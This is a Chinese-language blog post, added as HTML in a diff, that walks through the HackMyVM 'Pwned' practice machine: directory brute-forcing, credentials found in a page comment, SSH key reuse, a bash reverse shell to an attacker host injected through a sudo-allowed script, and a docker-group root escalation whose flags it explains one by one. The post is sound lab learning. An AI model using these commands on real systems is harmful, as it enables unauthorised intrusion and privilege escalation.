@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Pwned靶场复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Pwned">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/3123.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Pwned靶场复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png">
+<meta property="article:published_time" content="2025-01-29T14:03:19.000Z">
+<meta property="article:modified_time" content="2025-02-03T03:33:50.172Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/3123.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Pwned | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/3123.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Pwned
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-29 22:03:19" itemprop="dateCreated datePublished" datetime="2025-01-29T22:03:19+08:00">2025-01-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-03 11:33:50" itemprop="dateModified" datetime="2025-02-03T11:33:50+08:00">2025-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Pwned靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png"></p>
+<h1 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png" alt="|275"><br>开放了三个端口 ftp ssh  http  </p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>访问80端口 网页中只有一句话和一个注释<br><img src="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png"><br><img src="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png" alt="|450"><br>说明员工里面有一个女性<br>然后用dirsearch跑一遍   发现之后一个nothing目录  nothing里面确实是nothing😂<br>这里没有可以注入的点  也没有找到可以进入的目录   没有任何的方向了 说明一定是信息收集不够<br>用gobuster再跑一遍   <code>gobuster dir -u 192.168.240.74 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60</code><br>发现了新的目录  &#x2F;hidden_text<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png"><br>找到一个文件  里面又是一些目录的字典 现在再用dirsearch跑一遍     然后进入那个可以访问的界面<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png" alt="|375"><br><img src="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png"><br>进入后有一个登录界面  但是没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png" alt="|500"><br>发现有一个注释  注释里面有有用户名ftpuser 密码 B0ss_B!TcH  所以可以登录ftp 还能登录ssh</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png" alt="|375"><br>进入这个shell之后发现里面有两个文件  一个是rsa的私钥  然后告诉了我们一个用户ariana<br>现在就用这个私钥进入这个用户  在登录之前要先chmod 600<br>拿到ariana的shell<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png"><br>找到了另外一个用户selena<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png"><br>sudo -l 发现可以执行一个脚本<br><img src="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png"><br>脚本中的内容为：<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png" alt="|650"><br>这个脚本会echo $msg 就是你写入的消息会被打出来  所以我们可以用selena身份执行脚本  然后得到bash<br>这里nc 没有-e指令 学习一种新的反弹shell方式<br><code>bash -i &gt;&amp;/dev/tcp/ 攻击机_IP / 攻击机端口 0&gt;&amp;1</code>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64177395/article/details/143491556">反弹shell</a><br>这里我们直接发bash得到selena 的 shell<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png"><br>发现id在docker组 要用docker提权<br><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
+<h2 id="docker提权命令详细解释"><a href="#docker提权命令详细解释" class="headerlink" title="docker提权命令详细解释"></a>docker提权命令详细解释</h2><h4 id="1-docker-run"><a href="#1-docker-run" class="headerlink" title="1. docker run"></a>1. <code>docker run</code></h4><p>这是 Docker 命令，用于启动一个新的容器并运行指定的命令。</p>
+<h4 id="2-v-mnt"><a href="#2-v-mnt" class="headerlink" title="2. -v /:/mnt"></a>2. <code>-v /:/mnt</code></h4><ul>
+<li><code>-v</code> 是 Docker 的卷挂载选项，用于将宿主机的文件系统挂载到容器中。</li>
+<li><code>/</code> 表示宿主机的根文件系统。</li>
+<li><code>/mnt</code> 是容器内部的挂载点。</li>
+</ul>
+<p>所以，<code>-v /:/mnt</code> 这部分命令的作用是将宿主机的根文件系统 <code>/</code> 挂载到容器内部的 <code>/mnt</code> 目录。</p>
+<h4 id="3-rm"><a href="#3-rm" class="headerlink" title="3. --rm"></a>3. <code>--rm</code></h4><ul>
+<li><code>--rm</code> 表示在容器停止后自动删除容器。这使得容器在退出后不会在 Docker 主机上留下残余文件。</li>
+</ul>
+<h4 id="4-it"><a href="#4-it" class="headerlink" title="4. -it"></a>4. <code>-it</code></h4><ul>
+<li><code>-i</code>：保持容器的标准输入打开（交互式模式）。</li>
+<li><code>-t</code>：为容器分配一个伪终端，这样可以进行交互式操作。</li>
+</ul>
+<p>这两个选项组合起来意味着容器将以交互式模式运行，允许用户在容器内执行命令。</p>
+<h4 id="5-alpine"><a href="#5-alpine" class="headerlink" title="5. alpine"></a>5. <code>alpine</code></h4><ul>
+<li>这是一个小型的 Linux 发行版镜像，通常用于构建轻量级的 Docker 容器。它包含最基本的工具和库，非常适合用作基础镜像。</li>
+</ul>
+<h4 id="6-chroot-mnt"><a href="#6-chroot-mnt" class="headerlink" title="6. chroot /mnt"></a>6. <code>chroot /mnt</code></h4><ul>
+<li><code>chroot</code> 是 Linux 中的一个命令，用于改变当前进程的根目录。执行 <code>chroot /mnt</code> 后，容器内的文件系统根目录变成了 <code>/mnt</code>，而 <code>mnt</code> 被挂载到了宿主机的根文件系统 <code>/</code>。</li>
+<li>这意味着，容器内的程序和命令将认为 <code>/mnt</code> 是文件系统的根目录。由于 <code>/mnt</code> 映射了宿主机的根文件系统，这实际上使得容器内部的进程进入了宿主机的文件系统环境。</li>
+</ul>
+<h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
+<li><code>sh</code> 是在容器中执行的命令，它启动一个 shell（即 <code>sh</code>），允许你在容器内与宿主机的根文件系统交互。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/3123.html" title="HMV-Pwned">https://guayu-kakeru.github.io/posts/3123.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/52872.html" rel="prev" title="DC1靶场复盘">
+      <i class="fa fa-chevron-left"></i> DC1靶场复盘
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/10052.html" rel="next" title="HMV-Connection">
+      HMV-Connection <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwned"><span class="nav-text">Pwned</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A"><span class="nav-text">docker提权命令详细解释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-docker-run"><span class="nav-text">1. docker run</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-v-mnt"><span class="nav-text">2. -v &#x2F;:&#x2F;mnt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-rm"><span class="nav-text">3. --rm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-it"><span class="nav-text">4. -it</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-alpine"><span class="nav-text">5. alpine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-chroot-mnt"><span class="nav-text">6. chroot &#x2F;mnt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-sh"><span class="nav-text">7. sh</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
